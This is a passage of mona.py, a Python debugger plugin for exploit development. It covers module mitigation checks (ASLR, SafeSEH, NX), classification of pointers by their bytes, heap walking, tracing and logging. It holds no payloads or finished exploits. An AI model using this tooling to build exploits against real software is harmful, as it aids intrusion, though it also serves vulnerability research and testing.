			#else:
				#dbg.log("CallTrace : 0x%08x : %s" % (thisaddress,thisinstruction), address = thisaddress)
			# save to file
			try:
				FILE=open(self.logfile,"a")
				textra = ""
				for treg in dbglib.Registers32BitsOrder:
					if thisinstruction.lower().find(treg.lower()) > -1:
						textra += "%s = 0x%08x, " % (treg,regs[treg])
				if textra != "":
					textra = textra.strip(" ")
					textra = textra.strip(",")
					textra = "(" + textra + ")"
				FILE.write("0x%08x : %s %s\n" % (thisaddress, thisinstruction, textra))
				if self.showargs > 0:
					cnt = 0
					while cnt < len(allargs):
						content = ""
						try:
							bytecontent = dbg.readMemory(allargs[cnt],16)
							content = bin2hex(bytecontent)
						except:
							content = ""
						FILE.write("            Arg%d at 0x%08x : 0x%08x : %s\n" % (cnt,regs["ESP"]+(cnt*4),allargs[cnt],content))
						cnt += 1
				FILE.close()
			except:
				#dbg.log("OOPS", highlight=1)
				pass
		if thisinstruction.startswith("RETN"):
			returnto = 0
			try:
				returnto = struct.unpack('<L',dbg.readMemory(regs["ESP"],4))[0]
			except:
				returnto = 0
			#dbg.log("ReturnTrace : 0x%08x : %s - Return To 0x%08x" % (thisaddress,thisinstruction,returnto), address = thisaddress)
			try:
				FILE=open(self.logfile,"a")
				FILE.write("0x%08x : %s \n" % (thisaddress, thisinstruction))
				FILE.write("            ReturnTo at 0x%08x : 0x%08x\n" % (regs["ESP"],returnto))
				FILE.write("            EAX : 0x%08x\n" % regs["EAX"])
				FILE.close()
			except:
				pass
				
#---------------------------------------#
#   Class to set deferred BP Hooks      #
#---------------------------------------#

class MnDeferredHook(LogBpHook):
	def __init__(self, loadlibraryptr, targetptr):
		LogBpHook.__init__(self)
		self.targetptr = targetptr
		self.loadlibraryptr = loadlibraryptr
		
	def run(self,regs):
		#dbg.log("0x%08x - DLL Loaded, checking for %s" % (self.loadlibraryptr,self.targetptr), highlight=1)
		dbg.pause()
		if self.targetptr.find(".") > -1:
			# function name, try to resolve
			functionaddress = dbg.getAddress(self.targetptr)
			if functionaddress > 0:
				dbg.log("Deferred Breakpoint set at %s (0x%08x)" % (self.targetptr,functionaddress),highlight=1)
				dbg.setBreakpoint(functionaddress)
				self.UnHook()
				dbg.log("Hook removed")
				dbg.run()
				return
		if self.targetptr.find("+") > -1:
			ptrparts = self.targetptr.split("+")
			modname = ptrparts[0]
			if not modname.lower().endswith(".dll"):
				modname += ".dll" 
			themodule = getModuleObj(modname)
			if themodule != None and len(ptrparts) > 1:
				address = themodule.getBase() + int(ptrparts[1],16)
				if address > 0:
					dbg.log("Deferred Breakpoint set at %s (0x%08x)" % (self.targetptr,address),highlight=1)
					dbg.setBreakpoint(address)
					self.UnHook()
					dbg.log("Hook removed")
					dbg.run()
					return
		if self.targetptr.find("+") == -1 and self.targetptr.find(".") == -1:
			address = int(self.targetptr,16)
			thispage = dbg.getMemoryPageByAddress(address)
			if thispage != None:
				dbg.setBreakpoint(address)
				dbg.log("Deferred Breakpoint set at 0x%08x" % address, highlight=1)
				self.UnHook()
				dbg.log("Hook removed")
		dbg.run()

#---------------------------------------#
#   Class to access config file         #
#---------------------------------------#
class MnConfig:
	"""
	Class to perform config file operations
	"""
	def __init__(self):
	
		self.configfile = "mona.ini"
	
	def get(self,parameter):
		"""
		Retrieves the contents of a given parameter from the config file

		Arguments:
		parameter - the name of the parameter 

		Return:
		A string, containing the contents of that parameter
		"""	
		#read config file
		#format :  parameter=value
		toreturn = ""
		curparam=[]
		if os.path.exists(self.configfile):
			try:
				configfileobj = open(self.configfile,"rb")
				content = configfileobj.readlines()
				configfileobj.close()
				for thisLine in content:
					if not thisLine[0] == "#":
						currparam = thisLine.split('=')
						if currparam[0].strip().lower() == parameter.strip().lower() and len(currparam) > 1:
							#get value
							currvalue = ""
							i=1
							while i < len(currparam):
								currvalue = currvalue + currparam[i] + "="
								i += 1
							toreturn = currvalue.rstrip("=").replace('\n','').replace('\r','')
			except:
				toreturn=""
		
		return toreturn
	
	def set(self,parameter,paramvalue):
		"""
		Sets/Overwrites the contents of a given parameter in the config file

		Arguments:
		parameter - the name of the parameter 
		paramvalue - the new value of the parameter

		Return:
		nothing
		"""		
		if os.path.exists(self.configfile):
			#modify file
			try:
				configfileobj = open(self.configfile,"r")
				content = configfileobj.readlines()
				configfileobj.close()
				newcontent = []
				paramfound = False
				for thisLine in content:
					thisLine = thisLine.replace('\n','').replace('\r','')
					if not thisLine[0] == "#":
						currparam = thisLine.split('=')
						if currparam[0].strip().lower() == parameter.strip().lower():
							newcontent.append(parameter+"="+paramvalue+"\n")
							paramfound = True
						else:
							newcontent.append(thisLine+"\n")
					else:
						newcontent.append(thisLine+"\n")
				if not paramfound:
					newcontent.append(parameter+"="+paramvalue+"\n")
				#save new config file (rewrite)
				dbg.log("[+] Saving config file, modified parameter %s" % parameter)
				FILE=open(self.configfile,"w")
				FILE.writelines(newcontent)
				FILE.close()
			except:
				dbg.log("Error writing config file : %s : %s" % (sys.exc_type,sys.exc_value),highlight=1)
				return ""
		else:
			#create new file
			try:
				dbg.log("[+] Creating config file, setting parameter %s" % parameter)
				FILE=open(self.configfile,"w")
				FILE.write("# -----------------------------------------------#\n")
				FILE.write("# !mona.py configuration file                    #\n")
				FILE.write("# Corelan Team - https://www.corelan.be          #\n") 
				FILE.write("# -----------------------------------------------#\n")
				FILE.write(parameter+"="+paramvalue+"\n")
				FILE.close()
			except:
				dbg.log(" ** Error writing config file", highlight=1)
				return ""
		return ""
	
	
#---------------------------------------#
#   Class to log entries to file        #
#---------------------------------------#
class MnLog:
	"""
	Class to perform logfile operations
	"""
	def __init__(self, filename):
		
		self.filename = filename
		
			
	def reset(self,clear=True,showheader=True):
		"""
		Optionally clears a log file, write a header to the log file and return filename

		Optional :
		clear = Boolean. When set to false, the logfile won't be cleared. This method can be
		used to retrieve the full path to the logfile name of the current MnLog class object
		Logfiles are written to the debugger program folder, unless a config value 'workingfolder' is set.

		Return:
		full path to the logfile name.
		"""	
		global noheader
		if clear:
			if not silent:
				dbg.log("[+] Preparing output file '" + self.filename +"'")
		if not showheader:
			noheader = True
		debuggedname = dbg.getDebuggedName()
		thispid = dbg.getDebuggedPid()
		if thispid == 0:
			debuggedname = "_no_name_"
		thisconfig = MnConfig()
		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
		#strip extension from debuggedname
		parts = debuggedname.split(".")
		extlen = len(parts[len(parts)-1])+1
		debuggedname = debuggedname[0:len(debuggedname)-extlen]
		debuggedname = debuggedname.replace(" ","_")
		workingfolder = workingfolder.replace('%p', debuggedname)
		workingfolder = workingfolder.replace('%i', str(thispid))		
		logfile = workingfolder + "\\" + self.filename
		#does working folder exist ?
		if workingfolder != "":
			if not os.path.exists(workingfolder):
				try:
					dbg.log("    - Creating working folder %s" % workingfolder)
					#recursively create folders
					os.makedirs(workingfolder)
					dbg.log("    - Folder created")
				except:
					dbg.log("   ** Unable to create working folder %s, the debugger program folder will be used instead" % workingfolder,highlight=1)
					logfile = self.filename
		else:
			logfile = self.filename
		if clear:
			if not silent:
				dbg.log("    - (Re)setting logfile %s" % logfile)
			try:
				if os.path.exists(logfile):
					try:
						os.delete(logfile+".old")
					except:
						pass
					try:
						os.rename(logfile,logfile+".old")
					except:
						try:
							os.rename(logfile,logfile+".old2")
						except:
							pass
			except:
				pass
			#write header
			if not noheader:
				try:
					with open(logfile,"w") as fh:
						fh.write("=" * 80 + '\n')
						thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
						thisversion = thisversion.replace("'","")
						fh.write("  Output generated by mona.py v"+thisversion+", rev "+thisrevision+" - " + __DEBUGGERAPP__ + "\n")
						fh.write("  Corelan Team - https://www.corelan.be\n")
						fh.write("=" * 80 + '\n')
						osver=dbg.getOsVersion()
						osrel=dbg.getOsRelease()
						fh.write("  OS : " + osver + ", release " + osrel + "\n")
						fh.write("  Process being debugged : " + debuggedname +" (pid " + str(thispid) + ")\n")
						fh.write("=" * 80 + '\n')
						fh.write("  " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
						fh.write("=" * 80 + '\n')
				except:
					pass
			else:
				try:
					with open(logfile,"w") as fh:
						fh.write("")
				except:
					pass
			#write module table
			try:
				if not ignoremodules:
					showModuleTable(logfile)
			except:
				pass
		return logfile
		
	def write(self,entry,logfile):
		"""
		Write an entry (can be multiline) to a given logfile

		Arguments:
		entry - the data to write to the logfile
		logfile - the full path to the logfile

		Return:
		nothing
		"""		
		towrite = ""
		#check if entry is int 
		if type(entry) == int:
			if entry > 0:
				ptrx = MnPointer(entry)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				towrite = "0x" + toHex(entry) + " : " + ptrx.__str__() + " " + modinfo.__str__()
			else:
				towrite = entry
		else:
			towrite = entry
		towrite = str(towrite)
		try:
			with open(logfile,"a") as fh:
				if towrite.find('\n') > -1:
					fh.writelines(towrite)
				else:
					fh.write(towrite+"\n")
		except:
			pass
		return True
	
	
#---------------------------------------#
#  Class to access module properties    #
#---------------------------------------#
	
class MnModule:
	"""
	Class to access module properties
	"""
	def __init__(self, modulename):
		
		modisaslr = True
		modissafeseh = True
		modrebased = True
		modisnx = True
		modisos = True
		self.IAT = {}
		self.EAT = {}
		path = ""
		mzbase = 0
		mzsize = 0
		mztop = 0
		mcodebase = 0
		mcodesize = 0
		mcodetop = 0
		mentry = 0
		mversion = ""
		self.internalname = modulename
		if modulename != "":
			# if info is cached, retrieve from cache
			if ModInfoCached(modulename):
				modisaslr = getModuleProperty(modulename,"aslr")
				modissafeseh = getModuleProperty(modulename,"safeseh")
				modrebased = getModuleProperty(modulename,"rebase")
				modisnx = getModuleProperty(modulename,"nx")
				modisos = getModuleProperty(modulename,"os")
				path = getModuleProperty(modulename,"path")
				mzbase = getModuleProperty(modulename,"base")
				mzsize = getModuleProperty(modulename,"size")
				mztop = getModuleProperty(modulename,"top")
				mversion = getModuleProperty(modulename,"version")
				mentry = getModuleProperty(modulename,"entry")
				mcodebase = getModuleProperty(modulename,"codebase")
				mcodesize = getModuleProperty(modulename,"codesize")
				mcodetop = getModuleProperty(modulename,"codetop")
			else:
				#gather info manually - this code should only get called from populateModuleInfo()
				self.moduleobj = dbg.getModule(modulename)	
				modissafeseh = True
				modisaslr = True
				modisnx = True
				modrebased = False
				modisos = False
				
				mod       = self.moduleobj
				mzbase    = mod.getBaseAddress()
				mzrebase  = mod.getFixupbase()
				mzsize    = mod.getSize()
				mversion  = mod.getVersion()
				mentry    = mod.getEntry() 
				mcodebase = mod.getCodebase()
				mcodesize = mod.getCodesize()
				mcodetop  = mcodebase + mcodesize
				
				mversion=mversion.replace(", ",".")
				mversionfields=mversion.split('(')
				mversion=mversionfields[0].replace(" ","")
								
				if mversion=="":
					mversion="-1.0-"
				path=mod.getPath()
				if mod.getIssystemdll() == 0:
					modisos = "WINDOWS" in path.upper()
				else:
					modisos = True
				mztop = mzbase + mzsize
				if mzbase > 0:
					peoffset=struct.unpack('<L',dbg.readMemory(mzbase+0x3c,4))[0]
					pebase=mzbase+peoffset
					osver=dbg.getOsVersion()
					safeseh_offset = [0x5f, 0x5f, 0x5e]
					safeseh_flag = [0x4, 0x4, 0x400]
					os_index = 0
					# Vista / Win7 / Win8
					if win7mode:
						os_index = 2
					flags=struct.unpack('<H',dbg.readMemory(pebase+safeseh_offset[os_index],2))[0]
					numberofentries=struct.unpack('<L',dbg.readMemory(pebase+0x74,4))[0]
					#safeseh ?
					if (flags&safeseh_flag[os_index])!=0:
						modissafeseh=True
					else:
						if numberofentries>10:
							sectionaddress,sectionsize=struct.unpack('<LL',dbg.readMemory(pebase+0x78+8*10,8))
							sectionaddress+=mzbase
							data=struct.unpack('<L',dbg.readMemory(sectionaddress,4))[0]
							condition = False
							if os_index < 2:
								condition=(sectionsize!=0) and ((sectionsize==0x40) or (sectionsize==data))
							else:
								condition=(sectionsize!=0) and ((sectionsize==0x40))
							if condition==False:
								modissafeseh=False
							else:
								sehlistaddress,sehlistsize=struct.unpack('<LL',dbg.readMemory(sectionaddress+0x40,8))
								if sehlistaddress!=0 and sehlistsize!=0:
									modissafeseh=True
								else:
									modissafeseh=False
				
					#aslr
					if (flags&0x0040)==0:  # 'IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
						modisaslr=False
					#nx
					if (flags&0x0100)==0:
						modisnx=False
					#rebase
					if mzrebase <> mzbase:
						modrebased=True
		else:
			# should never be hit
			#print "No module specified !!!"
			#print "stacktrace : "
			#print traceback.format_exc()
			return None

		#check if module is excluded
		thisconfig = MnConfig()
		allexcluded = []
		excludedlist = thisconfig.get("excluded_modules")
		modfound = False
		if excludedlist:
			allexcluded = excludedlist.split(',')
			for exclentry in allexcluded:
				if exclentry.lower().strip() == modulename.lower().strip():
					modfound = True
		self.isExcluded = modfound
		
		#done - populate variables
		self.isAslr = modisaslr
		
		self.isSafeSEH = modissafeseh
		
		self.isRebase = modrebased
		
		self.isNX = modisnx
		
		self.isOS = modisos
		
		self.moduleKey = modulename
	
		self.modulePath = path
		
		self.moduleBase = mzbase
		
		self.moduleSize = mzsize
		
		self.moduleTop = mztop
		
		self.moduleVersion = mversion
		
		self.moduleEntry = mentry
		
		self.moduleCodesize = mcodesize
		
		self.moduleCodetop = mcodetop
		
		self.moduleCodebase = mcodebase
		
			
	
	def __str__(self):
		#return general info about the module
		#modulename + info
		"""
		Get information about a module (human readable format)

		Arguments:
		None

		Return:
		String with various properties about a module
		"""			
		outstring = ""
		if self.moduleKey != "":
			outstring = "[" + self.moduleKey + "] ASLR: " + str(self.isAslr) + ", Rebase: " + str(self.isRebase) + ", SafeSEH: " + str(self.isSafeSEH) + ", OS: " + str(self.isOS) + ", v" + self.moduleVersion + " (" + self.modulePath + ")"
		else:
			outstring = "[None]"
		return outstring
		
	def isAslr(self):
		return self.isAslr
		
	def isSafeSEH(self):
		return self.isSafeSEH
		
	def isRebase(self):
		return self.isRebase
		
	def isOS(self):
		return self.isOS
	
	def isNX(self):
		return self.isNX
		
	def moduleKey(self):
		return self.moduleKey
		
	def modulePath(self):
		return self.modulePath
	
	def moduleBase(self):
		return self.moduleBase
	
	def moduleSize(self):
		return self.moduleSize
	
	def moduleTop(self):
		return self.moduleTop
	
	def moduleEntry(self):
		return self.moduleEntry
		
	def moduleCodebase(self):
		return self.moduleCodebase
	
	def moduleCodesize(self):
		return self.moduleCodesize
		
	def moduleCodetop(self):
		return self.moduleCodetop
		
	def moduleVersion(self):
		return self.moduleVersion
		
	def isExcluded(self):
		return self.isExcluded
	
	def getFunctionCalls(self,criteria={}):
		funccalls = {}
		sequences = []
		sequences.append(["call","\xff\x15"])
		funccalls = searchInRange(sequences, self.moduleBase, self.moduleTop,criteria)
		return funccalls
		
	def getIAT(self):
		IAT = {}
		try:
			if len(self.IAT) == 0:
				themod = dbg.getModule(self.moduleKey)
				syms = themod.getSymbols()
				thename = ""
				for sym in syms:
					if syms[sym].getType().startswith("Import"):
						thename = syms[sym].getName()
						theaddress = syms[sym].getAddress()
						if not theaddress in IAT:
							IAT[theaddress] = thename
				
				if len(IAT) == 0:
					#search method nr 2, not accurate, but will find *something*
					funccalls = self.getFunctionCalls()
					for functype in funccalls:
						for fptr in funccalls[functype]:
							ptr=struct.unpack('<L',dbg.readMemory(fptr+2,4))[0]
							if ptr >= self.moduleBase and ptr <= self.moduleTop:
								if not ptr in IAT:
									thisfunc = dbglib.Function(dbg,ptr)
									thisfuncfullname = thisfunc.getName().lower()
									thisfuncname = []
									if thisfuncfullname.endswith(".unknown"):
										# see if we can find the original function name using the EAT
										iatptr = struct.unpack('<L',dbg.readMemory(ptr,4))[0]
										tptr = MnPointer(iatptr)
										modname = tptr.belongsTo()
										tmod = MnModule(modname)
										if not tmod is None:
											imagename = tmod.getShortName()
											eatlist = tmod.getEAT()
											if iatptr in eatlist:
												thisfuncfullname =  "." + imagename + "!" + eatlist[iatptr]
										thisfuncname = thisfuncfullname.split('.')	
									else:
										thisfuncname = thisfuncfullname.split('.')	
									IAT[ptr] = thisfuncname[1].strip(">")
				self.IAT = IAT
			else:
				IAT = self.IAT
		except:
			return IAT
		return IAT
		
		
	def getEAT(self):
		eatlist = {}
		if len(self.EAT) == 0:
			try:
				# avoid major suckage, let's do it ourselves
				# find optional header
				PEHeader_ref = self.moduleBase + 0x3c
				PEHeader_location = self.moduleBase + struct.unpack('<L',dbg.readMemory(PEHeader_ref,4))[0]
				# do we have an optional header ?
				bsizeOfOptionalHeader = dbg.readMemory(PEHeader_location+0x14,2)
				sizeOfOptionalHeader = struct.unpack('<L',bsizeOfOptionalHeader+"\x00\x00")[0]
				OptionalHeader_location = PEHeader_location + 0x18
				if sizeOfOptionalHeader > 0:
					# get address of DataDirectory
					DataDirectory_location = OptionalHeader_location + 0x60
					# get size of Export Table
					exporttable_size = struct.unpack('<L',dbg.readMemory(DataDirectory_location+4,4) )[0]
					exporttable_rva = struct.unpack('<L',dbg.readMemory(DataDirectory_location,4) )[0]
					if exporttable_size > 0:
						# get start of export table
						eatAddr = self.moduleBase + exporttable_rva
						nr_of_names = struct.unpack('<L',dbg.readMemory(eatAddr + 0x18,4))[0]
						rva_of_names = self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x20,4))[0]
						address_of_functions =  self.moduleBase + struct.unpack('<L',dbg.readMemory(eatAddr + 0x1c,4))[0]
						for i in range(0, nr_of_names):
							eatName = dbg.readString(self.moduleBase + struct.unpack('<L',dbg.readMemory(rva_of_names + (4 * i),4))[0])
							eatAddress = self.moduleBase + struct.unpack('<L',dbg.readMemory(address_of_functions + (4 * i),4))[0]
							eatlist[eatAddress] = eatName
				self.EAT = eatlist
			except:
				return eatlist
		else:
			eatlist = self.EAT
		return eatlist
	
	
	def getShortName(self):
		return stripExtension(self.moduleKey)

	
#---------------------------------------#
#  Class to access pointer properties   #
#---------------------------------------#
class MnPointer:
	"""
	Class to access pointer properties
	"""
	def __init__(self,address):
	
		# check that the address is an integer
		if not type(address) == int and not type(address) == long:
			raise Exception("address should be an integer or long")
	
		self.address = address
		
		# define the characteristics of the pointer
		byte1,byte2,byte3,byte4 = splitAddress(address)
		NullRange 			= [0]
		AsciiRange			= range(1,128)
		AsciiPrintRange		= range(20,127)
		AsciiUppercaseRange = range(65,91)
		AsciiLowercaseRange = range(97,123)
		AsciiAlphaRange     = AsciiUppercaseRange + AsciiLowercaseRange
		AsciiNumericRange   = range(48,58)
		AsciiSpaceRange     = [32]
		
		self.HexAddress = toHex(address)
		
		# Nulls
		self.hasNulls = (byte1 == 0) or (byte2 == 0) or (byte3 == 0) or (byte4 == 0)
		
		# Starts with null
		self.startsWithNull = (byte1 == 0)
		
		# Unicode
		self.isUnicode = ((byte1 == 0) and (byte3 == 0))
		
		# Unicode reversed
		self.isUnicodeRev = ((byte2 == 0) and (byte4 == 0))		
		
		# Unicode transform
		self.unicodeTransform = UnicodeTransformInfo(self.HexAddress) 
		
		# Ascii
		if not self.isUnicode and not self.isUnicodeRev:			
			self.isAscii = bytesInRange(address, AsciiRange)
		else:
			self.isAscii = bytesInRange(address, NullRange + AsciiRange)
		
		# AsciiPrintable
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAsciiPrintable = bytesInRange(address, AsciiPrintRange)
		else:
			self.isAsciiPrintable = bytesInRange(address, NullRange + AsciiPrintRange)
			
		# Uppercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUppercase = bytesInRange(address, AsciiUppercaseRange)
		else:
			self.isUppercase = bytesInRange(address, NullRange + AsciiUppercaseRange)
		
		# Lowercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowercase = bytesInRange(address, AsciiLowercaseRange)
		else:
			self.isLowercase = bytesInRange(address, NullRange + AsciiLowercaseRange)
			
		# Numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isNumeric = bytesInRange(address, AsciiNumericRange)
		else:
			self.isNumeric = bytesInRange(address, NullRange + AsciiNumericRange)
			
		# Alpha numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAlphaNumeric = bytesInRange(address, AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		else:
			self.isAlphaNumeric = bytesInRange(address, NullRange + AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		
		# Uppercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUpperNum = bytesInRange(address, AsciiUppercaseRange + AsciiNumericRange)
		else:
			self.isUpperNum = bytesInRange(address, NullRange + AsciiUppercaseRange + AsciiNumericRange)
		
		# Lowercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowerNum = bytesInRange(address, AsciiLowercaseRange + AsciiNumericRange)
		else:
			self.isLowerNum = bytesInRange(address, NullRange + AsciiLowercaseRange + AsciiNumericRange)
		
	
	def __str__(self):
		"""
		Get pointer properties (human readable format)

		Arguments:
		None

		Return:
		String with various properties about the pointer
		"""	

		outstring = ""
		if self.startsWithNull:
			outstring += "startnull,"
			
		elif self.hasNulls:
			outstring += "null,"
		
		#check if this pointer is unicode transform
		hexaddr = self.HexAddress
		outstring += UnicodeTransformInfo(hexaddr)

		if self.isUnicode:
			outstring += "unicode,"
		if self.isUnicodeRev:
			outstring += "unicodereverse,"			
		if self.isAsciiPrintable:
			outstring += "asciiprint,"
		if self.isAscii:
			outstring += "ascii,"
		if self.isUppercase:
			outstring == "upper,"
		if self.isLowercase:
			outstring += "lower,"
		if self.isNumeric:
			outstring+= "num,"
			
		if self.isAlphaNumeric and not (self.isUppercase or self.isLowercase or self.isNumeric):
			outstring += "alphanum,"
		
		if self.isUpperNum and not (self.isUppercase or self.isNumeric):
			outstring += "uppernum,"
		
		if self.isLowerNum and not (self.isLowercase or self.isNumeric):
			outstring += "lowernum,"
			
		outstring = outstring.rstrip(",")
		outstring += " {" + getPointerAccess(self.address)+"}"
		return outstring

	def getAddress(self):
		return self.address
	
	def isUnicode(self):
		return self.isUnicode
		
	def isUnicodeRev(self):
		return self.isUnicodeRev		
	
	def isUnicodeTransform(self):
		return self.unicodeTransform != ""
	
	def isAscii(self):
		return self.isAscii
	
	def isAsciiPrintable(self):
		return self.isAsciiPrintable
	
	def isUppercase(self):
		return self.isUppercase
	
	def isLowercase(self):
		return self.isLowercase
		
	def isUpperNum(self):
		return self.isUpperNum
		
	def isLowerNum(self):
		return self.isLowerNum
		
	def isNumeric(self):
		return self.isNumeric
		
	def isAlphaNumeric(self):
		return self.alphaNumeric
	
	def hasNulls(self):
		return self.hasNulls
	
	def startsWithNull(self):
		return self.startsWithNull
		
	def belongsTo(self):
		"""
		Retrieves the module a given pointer belongs to

		Arguments:
		None

		Return:
		String with the name of the module a pointer belongs to,
		or empty if pointer does not belong to a module
		"""		
		if len(g_modules)==0:
			populateModuleInfo()
		for thismodule,modproperties in g_modules.iteritems():
				thisbase = getModuleProperty(thismodule,"base")
				thistop = getModuleProperty(thismodule,"top")
				if (self.address >= thisbase) and (self.address <= thistop):
					return thismodule
		return ""
	
	def isOnStack(self):
		"""
		Checks if the pointer is on one of the stacks of one of the threads in the process

		Arguments:
		None

		Return:
		Boolean - True if pointer is on stack
		"""	
		stacks = getStacks()
		for stack in stacks:
			if (stacks[stack][0] < self.address) and (self.address < stacks[stack][1]):
				return True
		return False
	
	def isInHeap(self):
		"""
		Checks if the pointer is part of one of the pages associated with process heaps/segments

		Arguments:
		None

		Return:
		Boolean - True if pointer is in heap
		"""	
		segmentcnt = 0
		for heap in dbg.getHeapsAddress():
				# part of a segment ?
				segments = getSegmentsForHeap(heap)
				for segment in segments:
					if segmentcnt == 0:
						# in heap data structure
						if self.address >= heap and self.address <= segment:
							return True
						segmentcnt += 1
					if self.address >= segment:
						last = segments[segment][3]
						if self.address >= segment and self.address <= last:
							return True
		return False
		
	def getHeapInfo(self):
		"""
		Returns heap related information about a given pointer
		"""
		heapinfo = {}
		heapinfo["heap"] = 0
		heapinfo["segment"] = 0
		heapinfo["chunk"] = 0
		heapinfo["size"] = 0
		allheaps = dbg.getHeapsAddress()
		for heap in allheaps:
			theap = dbg.getHeap(heap)
			heapchunks = theap.getChunks(heap)
			if len(heapchunks) > 0:
				dbg.log("Querying segment(s) for heap 0x%s" % toHex(heap))
			for hchunk in heapchunks:
				chunkbase = hchunk.get("address")
				chunksize = hchunk.get("size")
				if self.address >= chunkbase and self.address <= (chunkbase+chunksize):
					heapinfo["heap"] = heap
					heapinfo["segment"] = 0
					heapinfo["chunk"] = chunkbase
					heapinfo["size"] = chunksize
		return heapinfo

	def showHeapBlockInfo(self):
		"""
		Find address in heap and print out info about heap, segment, block it belongs to
		"""
		allheaps = []
		heapkey = 0
		try:
			allheaps = dbg.getHeapsAddress()
		except:
			allheaps = []
		for heapbase in allheaps:
			if win7mode:
				# get key, if any
				heapkey = struct.unpack('<L',dbg.readMemory(heapbase+0x50,4))[0]
			segments = getSegmentsForHeap(heapbase)
			for seg in segments:
				segstart = segments[seg][0]
				segend = segments[seg][1]
				FirstEntry = segments[seg][2]
				LastValidEntry = segments[seg][3]								
				segblocks = walkSegment(FirstEntry,LastValidEntry,heapkey)
				for block in segblocks:
					thisblock = segblocks[block]
					unused = thisblock[3]
					blocksize =thisblock[1]*8 
					usersize = blocksize - unused
					headersize = thisblock[4]
					prevsize = thisblock[5]
					userptr = block + headersize
					flags = getHeapFlag(thisblock[2])
					if self.address >= block and self.address <= (block + headersize + blocksize):
						# found it !
						dbg.log("")
						dbg.log("Address 0x%08x found in " % self.address)
						dbg.log("    _HEAP @ %08x, Segment @ %08x" % (heapbase,seg))
						dbg.log("                      (         bytes        )                   (bytes)")						
						dbg.log("      HEAP_ENTRY      Size  PrevSize    Unused Flags    UserPtr  UserSize - state")
						dbg.log("        %08x  %08x  %08x  %08x  [%02x]   %08x  %08x   %s" % (block,blocksize,prevsize,unused,thisblock[2],userptr,usersize,flags))
						dbg.log("")
						if usersize < 32:
							contents = bin2hex(dbg.readMemory(userptr,usersize))
						else:
							contents = bin2hex(dbg.readMemory(userptr,32)) + " ..."
						dbg.log("    Contents : %s" % contents)
						blockinfo = {}
						blockinfo[block] = [segblocks[block],seg,segments[seg],heapbase]
						return blockinfo
		return None

	
	def memLocation(self):
		"""
		Gets the memory location associated with a given pointer (modulename, stack, heap or empty)
		
		Arguments:
		None
		
		Return:
		String
		"""
		memloc = self.belongsTo()
		
		if memloc == "":
			if self.isOnStack():
				return "Stack"
			if self.isInHeap():
				return "Heap"
			return "??"
		return memloc

	def getPtrFunction(self):
		funcinfo = ""
		global silent
		silent = True
		if __DEBUGGERAPP__ == "WinDBG":
			lncmd = "ln 0x%08x" % self.address
			lnoutput = dbg.nativeCommand(lncmd)
			for line in lnoutput.split("\n"):
				if line.replace(" ","") != "" and line.find("%08x" % self.address) > -1:
					lineparts = line.split("|")
					funcrefparts = lineparts[0].split(")")
					if len(funcrefparts) > 1:
						funcinfo = funcrefparts[1].replace(" ","")
						break

		if funcinfo == "":
			memloc = self.belongsTo()
			if not memloc == "":
				mod = MnModule(memloc)
				if not mod is None:
					start = mod.moduleBase
					offset = self.address - start
					offsettxt = ""
					if offset > 0:
						offsettxt = "+0x%08x" % offset
					else:
						offsettxt = "__base__"
					funcinfo = memloc+offsettxt
		silent = False
		return funcinfo
		
#---------------------------------------#
#  Various functions                    #
#---------------------------------------#
def getDefaultProcessHeap():
	peb = dbg.getPEBAddress()
	defprocheap = struct.unpack('<L',dbg.readMemory(peb+0x18,4))[0]
	return defprocheap

def getSortedSegmentList(heapbase):
	segments = getSegmentsForHeap(heapbase)
	sortedsegments = []
	for seg in segments:
		sortedsegments.append(seg)
	sortedsegments.sort()
	return sortedsegments

def getSegmentList(heapbase):
	return getSegmentsForHeap(heapbase)


def getSegmentsForHeap(heapbase):
	# either return the base of the segment, or the base of the default process heap
	allsegmentsfound = False
	segmentinfo = {}
	i = 0
	offset = 0x58
	subtract = 0
	os = dbg.getOsVersion()
	segmentcnt = 0
	if win7mode:
		# first one  = heap itself
		offset = 0xa8
		subtract = 0x10
		firstoffset = 0
		firstsegbase = struct.unpack('<L',dbg.readMemory(heapbase + 0x24,4))[0]
		firstsegend = struct.unpack('<L',dbg.readMemory(heapbase + 0x28,4))[0]
		if not firstsegbase in segmentinfo:
			segmentinfo[heapbase] = [firstsegbase,firstsegend,firstsegbase,firstsegend]
		# optional list with additional segments
		# nested list
		segbase = heapbase
		allsegmentsfound = False
		segmentcnt = 1
		while not allsegmentsfound and segmentcnt < 100:
			nextbase = struct.unpack('<L',dbg.readMemory(segbase + 0x10,4))[0] - subtract
			segbase = nextbase
			if nextbase > 0 and nextbase > firstsegend:
				segstart = struct.unpack('<L',dbg.readMemory(segbase + 0x24,4))[0]
				segend = struct.unpack('<L',dbg.readMemory(segbase + 0x28,4))[0]
				if not segbase in segmentinfo:
					segmentinfo[segbase] = [segbase,segend,segstart,segend]
			else:
				allsegmentsfound = True
			segmentcnt += 1
	else:
		while not allsegmentsfound:
			thisbase = struct.unpack('<L',dbg.readMemory(heapbase + offset + (i*4),4))[0]
			if thisbase > 0 and not thisbase in segmentinfo:
				# get start and end of segment
				segstart = thisbase
				segend = getSegmentEnd(segstart)
				# get first and last valid entry
				firstentry = struct.unpack('<L',dbg.readMemory(segstart + 0x20,4))[0]
				lastentry = struct.unpack('<L',dbg.readMemory(segstart + 0x24,4))[0]
				segmentinfo[thisbase] = [segstart,segend,firstentry,lastentry]
			else:
				allsegmentsfound = True
			i += 1
			# avoid infinite loop
			if i > 100:
				allsegmentsfound = True
	return segmentinfo

def containsBadChars(address,badchars="\x0a\x0d"):
	"""
	checks if the address contains bad chars
	
	Arguments:
	address  - the address
	badchars - string with the characters that should be avoided (defaults to 0x0a and 0x0d)
	
	Return:
	Boolean - True if badchars are found
	"""
	
